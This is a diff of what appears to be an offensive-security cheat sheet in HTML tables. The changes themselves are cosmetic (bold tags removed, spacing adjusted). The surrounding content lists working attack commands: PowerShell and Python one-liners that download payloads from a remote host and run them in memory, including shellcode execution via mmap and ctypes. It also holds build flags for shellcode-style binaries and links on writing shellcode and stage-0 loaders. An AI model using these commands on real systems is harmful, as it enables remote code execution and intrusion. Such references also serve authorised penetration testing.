@@ -58,82 +58,80 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
 
 <table>
   <tr>
-    <td><b>Compile C++ with cl.exe</b></td>
+    <td>Compile C++ with cl.exe</td>
     <td>
       <pre><code>cl.exe /nologo /MT /Ox /W0 /GS- /EHs- /GR- /DNDEBUG /Tp bubble_sort.cpp /link kernel32.lib /OUT:bubble_sort.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /MERGE:.rdata=.text /MERGE:.pdata=.text /MERGE:.data=.text</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Compile assembly with MASM</b></td>
+    <td>Compile assembly with MASM</td>
     <td>
       <pre><code>ml64 /c syscalls.asm /Fo syscalls.obj</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Compile C# with csc.exe</b></td>
+    <td>Compile C# with csc.exe</td>
     <td>
       <pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /optimize+ /debug- .\data_recovery.cs</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Compile C# with Roslyn Compiler</b></td>
+    <td>Compile C# with Roslyn Compiler</td>
     <td>
       <pre><code>& "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe" /optimize+ /unsafe /debug- .\program.cs .\Structs.cs</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Publish .NET Application</b></td>
+    <td>Publish .NET Application</td>
     <td>
       <pre><code>dotnet publish -c Release -r win-x64 --self-contained /p:PublishSingleFile=true /p:PublishTrimmed=true /p:EnableCompressionInSingleFile=true</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Convert COM Type Library to .NET Assembly</b></td>
+    <td>Convert COM Type Library to .NET Assembly</td>
     <td>
       <pre><code>tlbimp C:\Windows\System32\wsmauto.dll /out:WSManAutomation.dll</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Add Reference to .NET Project</b></td>
+    <td>Add Reference to .NET Project</td>
     <td>
       <pre><code>dotnet add reference WSManAutomation.dll</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>FreeBSD Cross-Compile with Clang</b></td>
+    <td>FreeBSD Cross-Compile with Clang</td>
     <td>
       <pre><code>clang --target=x86_64-unknown-freebsd12.2 --sysroot=/root/cross_compiler/freebsd-12.2-sysroot -I/root/cross_compiler/freebsd-12.2-sysroot/usr/include -L/root/cross_compiler/freebsd-12.2-sysroot/usr/lib -o shell shell.c -fPIC</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Writing Shellcode for Windows x64</b></td>
+    <td>Writing Shellcode for Windows x64</td>
     <td>
       <p>Source: <a href="https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/">Nytro Security Blog</a></p>
     </td>
   </tr>
   <tr>
-    <td><b>Writing Stage 0 for Windows x64</b></td>
+    <td>Writing Stage 0 for Windows x64</td>
     <td>
       <p>Source: <a href="https://github.com/ahmedkhlief/Ninja/blob/master/core/agents/cmd_shellcodex64.ninja">GitHub - Ninja Shellcode</a></p>
     </td>
   </tr>
   <tr>
-    <td><b>Assembler to Write Windows Assembly</b></td>
+    <td>Assembler to Write Windows Assembly</td>
     <td>
       <p>Online tool to convert x86/x64 assembly into raw shellcode bytes. Supports Intel syntax and includes disassembly features.</p>
       <p>Tool: <a href="https://defuse.ca/online-x86-assembler.htm">Defuse Online Assembler</a></p>
     </td>
   </tr>
   <tr>
-  <td><b>Windows Functions for Code Execution</b></td>
-  <td>
-    <a href="http://ropgadget.com/posts/abusing_win_functions.html">Abusing native Windows functions for shellcode execution</a></p>
-    <a href="https://github.com/nettitude/Tartarus-TpAllocInject/tree/main">Modern syscall lookup and thread pool execution</a></p>
-  </td>
-</tr>
-
+    <td>Windows Functions for Code Execution</td>
+    <td>
+      <a href="http://ropgadget.com/posts/abusing_win_functions.html">Abusing native Windows functions for shellcode execution</a></p>
+      <a href="https://github.com/nettitude/Tartarus-TpAllocInject/tree/main">Modern syscall lookup and thread pool execution</a></p>
+    </td>
+  </tr>
 </table>
-
 
 ---
 
@@ -189,43 +187,44 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
 
 <table>
   <tr>
-    <td><b>PowerUp in Memory (CMD)</b></td>
+    <td>PowerUp in Memory (CMD)</td>
     <td>
       <pre><code>echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1') | powershell -noprofile -</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>PowerUp in Memory (PowerShell)</b></td>
+    <td>PowerUp in Memory (PowerShell)</td>
     <td>
       <pre><code>wget('http://10.10.10.10/PowerUp.ps1') -UseBasicParsing | iex</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Python3 ELF In-Memory (No Params)</b></td>
+    <td>Python3 ELF In-Memory (No Params)</td>
     <td>
       <pre><code>python3.7 -c 'import os, urllib.request; d=urllib.request.urlopen("http://10.10.0.103/test.exe"); fd=os.memfd_create("foo"); os.write(fd,d.read()); p=f"/proc/self/fd/{fd}"; os.execve(p, [p], {})'</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Python3 ELF In-Memory (With Params)</b></td>
+    <td>Python3 ELF In-Memory (With Params)</td>
     <td>
       <pre><code>python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p,"-Pn", "-n", "127.0.0.1"], {})'</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Python2 Shellcode Execution</b></td>
+    <td>Python2 Shellcode Execution</td>
     <td>
       <pre><code>/usr/bin/python -c 'import urllib2,mmap,ctypes;d=urllib2.urlopen("http://10.10.10.10/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Python2 Temp ELF Execution</b></td>
+    <td>Python2 Temp ELF Execution</td>
     <td>
       <pre><code>/usr/bin/python -c 'import os,urllib2,tempfile;d=urllib2.urlopen("http://10.10.10.10/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0755);os.execve(f.name,[f.name,"-pthread"],{})'</code></pre>
     </td>
   </tr>
 </table>
 
+---
 
 ## Command & Control
 
@@ -352,7 +351,7 @@ def upload():
     return 'File uploaded successfully'
 
 app.run(host='0.0.0.0', port=80)</code></pre>
-      <p><i>Run with:</i><code>sudo python3 upload_server.py</code></p>
+      <p><i>Run with:</i><br><code>sudo python3 upload_server.py</code></p>
     </td>
   </tr>
 </table>
